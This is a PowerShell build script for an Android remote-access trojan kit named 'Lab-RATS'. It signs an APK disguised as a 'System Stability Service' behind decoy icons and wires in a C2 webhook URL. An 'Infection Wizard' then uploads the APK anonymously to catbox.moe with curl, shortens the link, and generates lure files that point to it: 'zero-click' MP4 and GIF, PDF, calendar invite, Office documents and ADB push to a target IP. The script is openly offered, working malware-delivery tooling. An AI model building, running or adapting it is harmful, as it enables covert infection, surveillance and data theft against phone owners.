#################################################
#                   Lab-RATS                    #
#                                               #
#        Android APK BUILDER - PowerShell       #
#                v1.5.1 Hardened                #
#                                               #
#             Developed by: K4N3CO              #
#################################################

$ErrorActionPreference = "Continue"

# Script paths
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir
$ConfigFile = Join-Path $ScriptDir "build_config.txt"

# Default settings
$DefaultSettings = @{
    KeyAlias = "lab-rats-key"
    KeystorePass = "lab-rats123"
    AppName = "System Stability Service"
    VersionName = "2.0"
    VersionCode = 20
}

function Write-Banner {
    Clear-Host
    Write-Host " ┌───────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
    Write-Host " │                                  .-         .                         │" -ForegroundColor Cyan
    Write-Host " │                               ....-        :                          │" -ForegroundColor Cyan
    Write-Host " │                            -==--+:.+. ..  -..+:-+                     │" -ForegroundColor Cyan
    Write-Host " │                            ++---:+.-==+==#:.+---+#                    │" -ForegroundColor Cyan
    Write-Host " │                             :=---:+++++=++=**-:-:                     │" -ForegroundColor Cyan
    Write-Host " │                               --+++:-=+++++++-=                       │" -ForegroundColor Cyan
    Write-Host " │                  .-.         :--+==:++-:-**+-+-                       │" -ForegroundColor Cyan
    Write-Host " │                    -.     .==:--+:+++=++++++++#.                      │" -ForegroundColor Cyan
    Write-Host " │                    :-    =---=::-++.=:.=.-==+....                     │" -ForegroundColor Cyan
    Write-Host " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │" -ForegroundColor Cyan
    Write-Host " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │" -ForegroundColor Cyan
    Write-Host " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │" -ForegroundColor Cyan
    Write-Host " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │" -ForegroundColor Cyan
    Write-Host " │                .-=:  .---=++++-++++#####*++..::--. .                  │" -ForegroundColor Cyan
    Write-Host " │                 .--++.--:----=+---=-++#++==.       .                  │" -ForegroundColor Cyan
    Write-Host " │                   --------=--:=:-:-====+++-                           │" -ForegroundColor Cyan
    Write-Host " │                       .--++++--++:+++==:=+.                           │" -ForegroundColor Cyan
    Write-Host " │                        .:+++::::--:..:-+=                             │" -ForegroundColor Cyan
    Write-Host " │                       .--=+=-+-+    -:---*---                         │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │" -ForegroundColor Cyan
    Write-Host " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │" -ForegroundColor Cyan
    Write-Host " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │" -ForegroundColor Cyan
    Write-Host " │                         DEVELOPED BY K4N3CO                           │" -ForegroundColor Cyan
    Write-Host " │                               © 2026                                  │" -ForegroundColor Cyan
    Write-Host " └───────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
    Write-Host ""
}

function Test-Requirements {
    Write-Host "[*] Checking requirements..." -ForegroundColor Cyan

    # Java check
    if (Get-Command java -ErrorAction SilentlyContinue) {
        $javaVer = java -version 2>&1 | Select-Object -First 1
        Write-Host "[OK] Java detected: $javaVer" -ForegroundColor Green
    } else {
        Write-Host "[!] Java is missing. Please install JDK 17 or 21." -ForegroundColor Red
        return $false
    }
    
    # Gradle check
    $gradlew = Join-Path $ProjectDir "gradlew.bat"
    if (-not (Test-Path $gradlew)) {
        Write-Host "[!] gradlew.bat not found in $ProjectDir" -ForegroundColor Red
        return $false
    }
    
    return $true
}

function New-Keystore {
    param([bool]$AutoGenerate = $false)
    
    $keystorePath = Join-Path $ProjectDir "lab-rats-keystore.jks"
    if ((Test-Path $keystorePath) -and -not $AutoGenerate) {
        $choice = Read-Host "    Keystore already exists. Regenerate? (y/N)"
        if ($choice -notmatch "[yY]") { return }
        Remove-Item $keystorePath -Force
    }
    
    Write-Host "[*] Generating signing keystore..." -ForegroundColor Cyan
    $pass = $DefaultSettings.KeystorePass
    $alias = $DefaultSettings.KeyAlias
    
    $dname = "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname $dname 2>$null
    
    $propsPath = Join-Path $ProjectDir "keystore.properties"
    $propsContent = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
    Set-Content $propsPath $propsContent
    
    Write-Host "[OK] Keystore ready: $keystorePath" -ForegroundColor Green
}

function Set-AppConfig {
    Write-Banner
    Write-Host "[*] App Configuration" -ForegroundColor Cyan
    Write-Host ""

    $appName = Read-Host "    Enter App Name [System Stability Service]"
    if ([string]::IsNullOrEmpty($appName)) { $appName = $DefaultSettings.AppName }
    
    $pkgName = Read-Host "    Enter Package ID [com.android.system.stability]"
    if ([string]::IsNullOrEmpty($pkgName)) { $pkgName = "com.android.system.stability" }
    
    $verName = Read-Host "    Enter Version Name [2.0]"
    if ([string]::IsNullOrEmpty($verName)) { $verName = $DefaultSettings.VersionName }
    
    $minSdk = Read-Host "    Enter Min SDK [21]"
    if ([string]::IsNullOrEmpty($minSdk)) { $minSdk = 21 }

    # Decoy Identity Selection
    Write-Host ""
    Write-Host "[*] Decoy Identity Selection" -ForegroundColor Cyan
    Write-Host "    (The app logo will transform into your selection immediately after install on device)" -ForegroundColor Yellow
    Write-Host "    1. System Update (Gear)  2. Calculator"
    Write-Host "    3. Weather               4. Settings"
    Write-Host "    5. Lab-RATS Logo"
    Write-Host ""
    $decoyChoice = Read-Host "    Choice (Default 1)"
    if ([string]::IsNullOrEmpty($decoyChoice)) { $decoyChoice = "1" }

    # Update build.gradle
    $buildGradle = Join-Path $ProjectDir "app\build.gradle"
    if (Test-Path $buildGradle) {
        $content = Get-Content $buildGradle -Raw
        $content = $content -replace 'applicationId "[^"]+"', "applicationId `"$pkgName`""
        $content = $content -replace 'versionName "[^"]+"', "versionName `"$verName`""
        $content = $content -replace 'minSdk \d+', "minSdk $minSdk"
        Set-Content $buildGradle $content
    }

    # Update strings.xml
    $stringsXml = Join-Path $ProjectDir "app\src\main\res\values\strings.xml"
    if (Test-Path $stringsXml) {
        $content = Get-Content $stringsXml -Raw
        $content = $content -replace '<string name="app_name">[^<]+</string>', "<string name=`"app_name`">$appName</string>"
        Set-Content $stringsXml $content
    }

    # Update local.properties
    $localProps = Join-Path $ProjectDir "local.properties"
    $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
    
    $props = ""
    if (Test-Path $localProps) { $props = Get-Content $localProps }
    
    $newProps = @()
    $foundWebhook = $false
    $foundDecoy = $false

    foreach ($line in $props) {
        if ($line -like "WEBHOOK_URL=*") {
            $newProps += "WEBHOOK_URL=$webhookUrl"
            $foundWebhook = $true
        } elseif ($line -like "DECOY_CHOICE=*") {
            $newProps += "DECOY_CHOICE=$decoyChoice"
            $foundDecoy = $true
        } else {
            $newProps += $line
        }
    }
    
    if (-not $foundWebhook) { $newProps += "WEBHOOK_URL=$webhookUrl" }
    if (-not $foundDecoy) { $newProps += "DECOY_CHOICE=$decoyChoice" }
    
    Set-Content $localProps ($newProps -join "`n")

    Write-Host "[OK] Configuration applied" -ForegroundColor Green
}

function Build-Apk {
    Write-Banner
    Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan

    Set-Location $ProjectDir
    & .\gradlew.bat clean assembleRelease --no-daemon
    
    $outputDir = Join-Path $ScriptDir "output"
    if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }

    $apkPath = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release.apk"
    if (Test-Path $apkPath) {
        Copy-Item $apkPath (Join-Path $outputDir "signed_v1.apk") -Force
        Write-Host "`n[OK] Build successful: apk-builder/output/signed_v1.apk" -ForegroundColor Green
    } else {
        Write-Host "`n[!] Build failed. Check build_log.txt" -ForegroundColor Red
    }
    
    Set-Location $ScriptDir
    Read-Host "    Press Enter to continue"
}

function New-ExploitStandalone {
    param($Type, $Url, $Extra)

    $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
    $tempBin = Join-Path $ScriptDir "bin"
    if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }

    Write-Host "[*] Compiling Exploit Generator..." -ForegroundColor Cyan
    & javac -sourcepath (Join-Path $ProjectDir "app\src\main\java") -d $tempBin $exploitSrc

    if ($LASTEXITCODE -eq 0) {
        Set-Location (Join-Path $ScriptDir "output")
        & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
        Set-Location $ScriptDir
    } else {
        Write-Host "[!] Exploit compilation failed." -ForegroundColor Red
    }
}

function Invoke-InfectionWizard {
    Write-Banner
    Write-Host "[>] STRATEGIC_INFECTION_WIZARD" -ForegroundColor Red
    Write-Host "    Step-by-step automated payload weaponization." -ForegroundColor Yellow
    Write-Host ""

    if (-not (Test-Requirements)) { return }
    New-Keystore -AutoGenerate $true
    Set-AppConfig
    Build-Apk

    $downloadUrl = ""
    Write-Host ""
    Write-Host "[HOSTING] Select strategy:" -ForegroundColor Cyan
    Write-Host "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
    $h = Read-Host "    Choice"

    if ($h -eq "2") {
        $ip = Read-Host "    Target IPv6"
        $downloadUrl = "http://[$ip]:9191/download/Update.apk"
    } else {
        Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
        $signedApk = Join-Path $ScriptDir "output\signed_v1.apk"
        $resp = curl.exe -sS -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php
        if ($resp -match "http") {
            $downloadUrl = $resp.Trim()
            Write-Host "[OK] Hosted: $downloadUrl" -ForegroundColor Green

            $short = curl.exe -s "https://is.gd/create.php?format=simple&url=$downloadUrl"
            if ($short -match "http") {
                $downloadUrl = $short.Trim()
                Write-Host "[OK] Shortened: $downloadUrl" -ForegroundColor Green
            }
        } else {
            Write-Host "[!] Upload failed: $resp" -ForegroundColor Red
            Read-Host "    Press Enter to return"
            return
        }
    }

    Write-Host ""
    Write-Host "[WEAPONIZE] Select Vector:" -ForegroundColor Cyan
    Write-Host "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
    Write-Host "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
    Write-Host "    7. Stego Image     8. PWA Bundle    9. Office Word"
    Write-Host "    10. Office Excel   11. Ghost GIF (Zero-Click)"
    $v = Read-Host "    Choice"

    switch ($v) {
        "1" { New-ExploitStandalone "mp4" $downloadUrl "" }
        "2" { New-ExploitStandalone "pdf" $downloadUrl "Security_Audit" }
        "3" { New-ExploitStandalone "ics" $downloadUrl "Security_Sync" }
        "4" { New-ExploitStandalone "dolby" $downloadUrl "" }
        "5" { $tip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $downloadUrl $tip }
        "6" { New-ExploitStandalone "vcf" $downloadUrl "System_Update" }
        "7" { New-ExploitStandalone "stego" $downloadUrl "" }
        "8" { New-ExploitStandalone "pwa" $downloadUrl "System_Update" }
        "9" { New-ExploitStandalone "docx" $downloadUrl "Security_Patch" }
        "10" { New-ExploitStandalone "xlsx" $downloadUrl "Financial_Report" }
        "11" { New-ExploitStandalone "gif" $downloadUrl "" }
    }

    Write-Host "`nDEPLOYMENT PACKAGE READY: $downloadUrl" -ForegroundColor Green
    Read-Host "    Press Enter to return to menu"
}

function Show-ExploitLab {
    Write-Banner
    Write-Host "[>] Weaponized Payload Lab (Hardened Tier)" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "    1. Zero-Click MP4 (Media Heap Overflow)"
    Write-Host "    2. Stealth PDF (URI Trigger Vector)"
    Write-Host "    3. Calendar Injection (.ics System Alert)"
    Write-Host "    4. PWA WebAPK Manifest & Service Worker"
    Write-Host "    5. Return to Main Menu"
    Write-Host ""
    $e = Read-Host "    Choice"

    $c2Url = "http://127.0.0.1:8080"
    $localProps = Join-Path $ProjectDir "local.properties"
    if (Test-Path $localProps) {
        $props = Get-Content $localProps
        foreach ($line in $props) {
            if ($line -like "WEBHOOK_URL=*") { $c2Url = $line.Split("=")[1] }
        }
    }

    switch ($e) {
        "1" { New-ExploitStandalone "mp4" $c2Url "" }
        "2" { $t = Read-Host "    Enter PDF Title"; New-ExploitStandalone "pdf" $c2Url $t }
        "3" { $s = Read-Host "    Enter Meeting Summary"; New-ExploitStandalone "ics" $c2Url $s }
        "4" { New-ExploitStandalone "pwa" $c2Url "" }
        "5" { return }
    }
    Write-Host ""
    Read-Host "    Press Enter to return to Lab"
    Show-ExploitLab
}

function Show-Help {
    Write-Banner
    Write-Host "COMMAND_DOCUMENTATION_V1.5.1" -ForegroundColor White
    Write-Host "------------------------------------------------------------"
    Write-Host "1. Start Build: Standard production flow."
    Write-Host "2. Keystore Only: Unique signing certificate."
    Write-Host "3. App Settings: Change ID, Name, and Version."
    Write-Host "4. Requirements: Check Java setup."
    Write-Host "5. Infection Wizard: Full Build -> Host -> Weaponize."
    Write-Host "6. Exploit Lab: Generate standalone tactical vectors."
    Write-Host "------------------------------------------------------------"
    Read-Host "    Press Enter to return"
}

function Show-MainMenu {
    while ($true) {
        Write-Banner
        Write-Host "[>] Build Options:" -ForegroundColor Magenta
        Write-Host ""
        Write-Host "    1. Start Build (Configure & Build)"
        Write-Host "    2. Generate Keystore Only"
        Write-Host "    3. Configure App Settings Only"
        Write-Host "    4. Check Requirements"
        Write-Host "    5. Generate Infection Chain Package (Wizard)"
        Write-Host "    6. Weaponized Payload Lab"
        Write-Host "    7. Help / Documentation"
        Write-Host "    8. Exit"
        Write-Host ""
        $option = Read-Host "    Choose option (Default 1)"
        if ([string]::IsNullOrEmpty($option)) { $option = "1" }

        switch ($option) {
            "1" { if (Test-Requirements) { New-Keystore -AutoGenerate $true; Set-AppConfig; Build-Apk } }
            "2" { if (Test-Requirements) { New-Keystore } }
            "3" { Set-AppConfig }
            "4" { Test-Requirements | Out-Null; Read-Host "    Press Enter to return" | Out-Null }
            "5" { Invoke-InfectionWizard }
            "6" { Show-ExploitLab }
            "7" { Show-Help }
            "8" { exit 0 }
        }
    }
}

Show-MainMenu
